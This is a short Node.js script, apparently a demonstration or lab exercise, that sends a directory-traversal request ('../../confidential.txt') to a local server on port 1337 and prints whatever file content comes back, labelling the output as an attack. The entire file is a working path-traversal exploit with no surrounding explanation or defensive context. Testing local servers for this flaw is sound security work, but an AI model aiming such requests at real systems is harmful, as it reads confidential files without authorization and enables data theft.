(function() {
    var http = require('http');
    var colors = require('colors');
    var content;
    var url = 'http://localhost:1337/../../confidential.txt';

    console.log('\t[' + 'directory traversal attack'.green + ']: ' + url);

    http.get(url, (res) => {
        res.on('data', (chunk) => {
            content = chunk.toString('utf-8');
            console.log('\t[' + 'directory traversal request response'.green + ']: ' + content.red);
        });
    });
})();